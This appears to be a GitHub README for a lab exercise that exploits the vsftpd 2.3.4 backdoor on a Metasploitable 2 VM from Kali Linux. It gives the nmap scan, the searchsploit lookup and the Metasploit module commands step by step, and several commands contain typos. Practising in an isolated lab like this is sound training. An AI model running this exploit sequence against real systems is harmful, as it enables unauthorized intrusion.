# Creating a Metasploitable Machine and Compromising it
This is the procedure to create a Metasploitable Machine and compromise the system using Metasploit.<br>
It is assumed that both the network for the Target Machine (Metasploitable 2) and the Hacking Lab (Kali Linux) are configured to NatNetwork in Virtualbox.<br>
Both should be running before performing the exploitation.<br> Metasploitable 2 has the msfconsole 6 which is what is used in the hacking process.<br>
Kali Linux version 2022.1 is used.<br>
The pdf file contains the full Metasploitable installation procedure (starting from downloading, and configuring) in Virtualbox, configuring the network interface between the Kali Linux Machine (Your hacking lab) and the Target Machine (Metasploitable) and compromising the target machine.<br>

<b>STEP 1: Power up your Kali Linux and Metasploitable Virtual Machines.<br>

STEP 2: Login to Metasploitable. We need to fetch the IP Address which is needed to compromise the system. Hence, the need to login.<br><br>
![9](https://user-images.githubusercontent.com/118365903/202857144-160dcb82-4bc1-476f-8c4f-bc8d919751eb.png)<br><br>
STEP 3: In the Metasploitable shell, run the ifconfig command to retrieve the ip address to use in Kali Linux<br>

STEP 4: In Kali Linux, make sure to login to root<br>

STEP 5: Run NMAP command to show the list of open ports to which to exploit using the IP Address retrieved in STEP 3 - nmap –Sc –Sv –O –o Metasploit 10.0.2.6<br><br>
![10](https://user-images.githubusercontent.com/118365903/202857145-5c3cdb2c-dca6-4070-ba71-fef5372f09a5.png)<br><br>
The ftp protocol running on port 21 is open and we want to exploit it. Copy the version number vsftpd 2.3.4<br>

STEP 6: To view the exploit, type the following command - searchploit vsftpd 2.3.4<br><br>
![11](https://user-images.githubusercontent.com/118365903/202857148-a65cd4f4-cdc4-4414-941a-c2b8ccdfaf85.png)<br><br>
STEP 7: Type msfconle to boot Metasploitable shell<br>

STEP 8: Search for the exploit ftp module vsftpd in the msfconsole by typing - search vsftpd<br><br>
![12](https://user-images.githubusercontent.com/118365903/202857150-39feef3e-949e-46b8-bc9a-85efc30069d2.png)<br><br>

STEP 9: Copy the name of the exploit (this shows where the directory of the exploit is stored in Kali Linux) and run the command to use the exploit - use exploit/unix/ftp/vsftpd_234_backdoor<br><br>
![13](https://user-images.githubusercontent.com/118365903/202857151-20fb6b50-09c2-4797-8dba-a4bd125ab2e8.png)<br><br>

STEP 10: Type options to show the options of the exploit module in the current folder<br><br>
![14](https://user-images.githubusercontent.com/118365903/202857152-abe7469c-42e2-4f47-bfda-6a3e546956ff.png)<br><br>
RHOSTS is the remote host (the target machine’s IP Address that you what to exploit).<br>

STEP 11: Type the command - set RHOSTS 10.0.2.6 (You should replace with your IP Address) <br>

STEP 12: Type the run command or exploit to compromise the system - run<br><br>
![15](https://user-images.githubusercontent.com/118365903/202857156-f7c129a0-0ba8-4003-a37c-9da414b99511.png)</b>
